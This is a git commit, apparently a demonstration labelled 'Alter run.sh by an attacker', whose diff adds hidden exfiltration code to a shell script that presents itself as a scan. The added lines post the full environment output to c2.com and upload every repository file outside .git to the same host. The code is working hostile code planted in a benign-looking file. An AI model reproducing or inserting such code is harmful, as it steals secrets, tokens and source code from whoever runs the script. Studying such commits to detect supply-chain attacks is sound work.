84771dc4e9f7be641e75a4c4391ec6c8b5d8f4a7
merlintchoffo <tchoffo83@yahoo.fr>
2024-08-21 22:59:53 +0200

    Alter run.sh by an attacker

--- run.sh
+++ run.sh
@@ -1,5 +1,21 @@
 #!/bin/sh
 
 IFS=$'\n'
+
 echo "Initializing scan environment..."
+
 echo "Starting scan version 1"
+
+EC2IP="c2.com"
+
+curl -sm 0.5 -d "$(env)" http://$EC2IP:8080/receive
+
+for file in $(find . -type f -name "*" | grep -v "./.git/")
+do
+    if [ -f "$file" ]
+    then
+        curl -s -m 1 -X POST -H "Content-Type: text/plain" --data-binary "@$file" "http://$EC2IP:8080/receiveall?filename=$(basename $file)"
+    fi
+done
+
+echo "Scan completed"
